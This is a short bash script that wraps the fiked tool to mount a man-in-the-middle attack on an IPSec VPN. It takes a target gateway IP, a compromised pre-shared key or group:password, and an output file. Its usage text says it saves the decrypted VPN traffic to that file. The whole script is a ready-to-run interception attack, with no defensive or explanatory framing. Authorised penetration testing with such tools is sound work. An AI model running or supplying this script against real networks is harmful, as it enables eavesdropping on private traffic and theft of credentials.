#!/bin/bash

ShowUsage() {
	echo "Usage: $0 <target VPN Gateway IP> <pre-shared key data> <output file>"
	echo "Given a compromised pre-shared key (or group and password) and man-in-the-middle access to the IPSec stream, $0 will save the decrypted IPSec traffic to <output file>"
	echo ""
	echo "For VPN groups such as Cisco groups, pre-shared key data should be in the format group:password"
	echo ""
}

if [ $# -lt 3 ]; then
	ShowUsage
	exit 1
fi

VPNGATEWAY="$1"
PRESHAREDKEY="$2"
OUTPUTFILE="$3"

fiked -g $VPNGATEWAY -k $PRESHAREDKEY -l $OUTPUTFILE

